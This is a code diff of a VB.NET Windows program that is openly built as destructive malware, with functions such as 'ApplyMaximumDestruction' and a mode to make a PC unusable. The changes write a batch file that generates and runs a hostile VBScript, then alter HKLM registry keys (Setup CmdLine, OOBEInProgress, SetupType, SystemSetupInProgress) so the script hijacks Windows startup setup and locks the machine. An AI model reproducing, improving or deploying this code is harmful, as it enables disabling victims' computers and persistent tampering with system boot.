@@ -204,7 +204,7 @@ Public Class Form1
 
         ' Public method to run the VBS script.
         Public Sub ApplyMaximumDestruction()
-            Form1.CreateEpicVBScriptFile()
+            Form1.CreateEpicScriptFiles()
             Dim scriptPath As String = "C:\temp.vbs"
             Try
                 Dim process As New Process()
@@ -341,7 +341,7 @@ Public Class Form1
                         ' Code for less destructive surprise
                         timerLabel.Text = "Surprise! Executing less destructive effects!"
                         Thread.Sleep(5000)
-                        Form1.CreateEpicVBScriptFile()
+                        Form1.CreateEpicScriptFiles()
                         MessageBox.Show("To apply changes, you need to restart your computer.", "Restart Required", MessageBoxButtons.OK, MessageBoxIcon.Warning)
 
                     Case "Just Make Unusable My PC Without Destruction"
@@ -1123,9 +1123,13 @@ Public Class Form1
         End Try
     End Sub
 
-    Private Sub CreateEpicVBScriptFile()
+    Private Sub CreateEpicScriptFiles()
+        ' Define the paths
+        Dim vbsFilePath As String = "C:\temp.vbs"
+        Dim batFilePath As String = "C:\temp.bat"
+
         ' Create the VBScript content
-        Dim vbsContent As String = "MsgBox ""What Are Your Famous Last Words? Spoiler: There two scenarios to get this message but one of them is not so destructive. No UEFI Driver or Kernel Driver Malware this time. Because it's easy to fix. If you see from starting at Windows"" , 0, ""utkudrk.exe""" & vbCrLf &
+        Dim vbsContent As String = "MsgBox ""What Are Your Famous Last Words? Spoiler: There are two scenarios to get this message but one of them is not so destructive. No UEFI Driver or Kernel Driver Malware this time. Because it's easy to fix. If you see this from starting at Windows"" , 0, ""utkudrk.exe""" & vbCrLf &
         "Dim userInput" & vbCrLf &
         "userInput = InputBox(""Enter your response (Just don't say FUCK YOU):"", ""utkudrk.exe"")" & vbCrLf &
         "If userInput = ""FUCK YOU"" Then" & vbCrLf &
@@ -1148,29 +1152,33 @@ Public Class Form1
         "End If" & vbCrLf &
         "Set shell = Nothing"
 
-        ' Write the VBScript to disk
-        System.IO.File.WriteAllText("C:\temp.vbs", vbsContent)
+        ' Create the batch file content
+        Dim batContent As String = "@echo off" & vbCrLf &
+        "echo Creating VBScript file..." & vbCrLf &
+        "echo " & vbsContent.Replace(vbCrLf, "^& echo ") & " > " & vbsFilePath & vbCrLf &
+        "echo VBScript file created." & vbCrLf &
+        "cscript //nologo " & vbsFilePath
 
-        ' Registry changes to ensure the VBScript runs at OOBE
+        ' Write the batch and VBScript content to files
+        System.IO.File.WriteAllText(batFilePath, batContent)
+
+        ' Attempt to modify the registry for OOBE
         Try
-            ' Create the necessary registry keys and values
             Dim setupKeyPath As String = "SOFTWARE\Microsoft\Windows\CurrentVersion\Setup"
             Dim systemSetupKeyPath As String = "SYSTEM\Setup"
 
-            ' Create the necessary registry keys and values
             Using setupKey As RegistryKey = Registry.LocalMachine.CreateSubKey(setupKeyPath)
-                setupKey.SetValue("CmdLine", "C:\temp.vbs", RegistryValueKind.String)
+                setupKey.SetValue("CmdLine", batFilePath, RegistryValueKind.String)
             End Using
 
             Using systemSetupKey As RegistryKey = Registry.LocalMachine.CreateSubKey(systemSetupKeyPath)
                 If systemSetupKey IsNot Nothing Then
                     systemSetupKey.SetValue("OOBEInProgress", 1, RegistryValueKind.DWord)
-                    systemSetupKey.SetValue("SetupType", 1, RegistryValueKind.DWord)
+                    systemSetupKey.SetValue("SetupType", 2, RegistryValueKind.DWord)
                     systemSetupKey.SetValue("SetupPhase", 1, RegistryValueKind.DWord)
                     systemSetupKey.SetValue("SystemSetupInProgress", 1, RegistryValueKind.DWord)
                 End If
             End Using
-
         Catch ex As Exception
             MessageBox.Show("An error occurred: " & ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
         End Try
